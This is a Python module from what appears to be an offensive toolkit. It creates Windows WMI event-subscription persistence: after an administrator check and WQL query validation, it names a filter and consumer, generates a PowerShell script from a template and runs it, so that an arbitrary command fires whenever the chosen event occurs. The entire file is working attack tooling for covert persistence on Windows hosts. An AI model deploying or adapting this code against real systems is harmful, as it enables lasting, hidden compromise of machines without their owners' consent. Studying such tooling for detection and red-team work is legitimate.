"""
Custom WQL query-based WMI persistence
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import run_powershell, check_admin, validate_wql_query
from templates.powershell import generate_creation_script

def create_custom_persistence(event_name, command, wql_query):
    """
    Create WMI persistence with custom WQL query
    
    Args:
        event_name (str): Event name prefix
        command (str): Command to execute
        wql_query (str): Custom WQL event query
        
    Returns:
        dict: Creation result
    """
    print(f"[*] Creating custom WQL-based WMI persistence...")
    
    if not check_admin():
        print("[!] Administrator privileges required")
        return {
            'success': False,
            'error': 'Administrator privileges required'
        }
    
    # Validate WQL query
    is_valid, error = validate_wql_query(wql_query)
    if not is_valid:
        print(f"[-] Invalid WQL query: {error}")
        return {
            'success': False,
            'error': f'Invalid WQL query: {error}'
        }
    
    # Generate names
    filter_name = f"_{event_name}_Filter"
    consumer_name = f"_{event_name}_Consumer"
    
    print(f"[*] WQL Query: {wql_query}")
    
    # Generate PowerShell script
    ps_script = generate_creation_script(
        filter_name=filter_name,
        consumer_name=consumer_name,
        wql_query=wql_query,
        command=command
    )
    
    # Execute script
    result = run_powershell(ps_script)
    
    if result['success']:
        print(f"[+] Custom WMI persistence created successfully")
        print(f"[+] Event Name: {event_name}")
        print(f"[+] Filter: {filter_name}")
        print(f"[+] Consumer: {consumer_name}")
        
        return {
            'success': True,
            'event_name': event_name,
            'filter_name': filter_name,
            'consumer_name': consumer_name,
            'trigger_type': 'custom',
            'command': command,
            'wql_query': wql_query
        }
    else:
        error = result.get('stderr', result.get('error', 'Unknown error'))
        print(f"[-] Failed to create WMI persistence: {error}")
        return {
            'success': False,
            'error': error
        }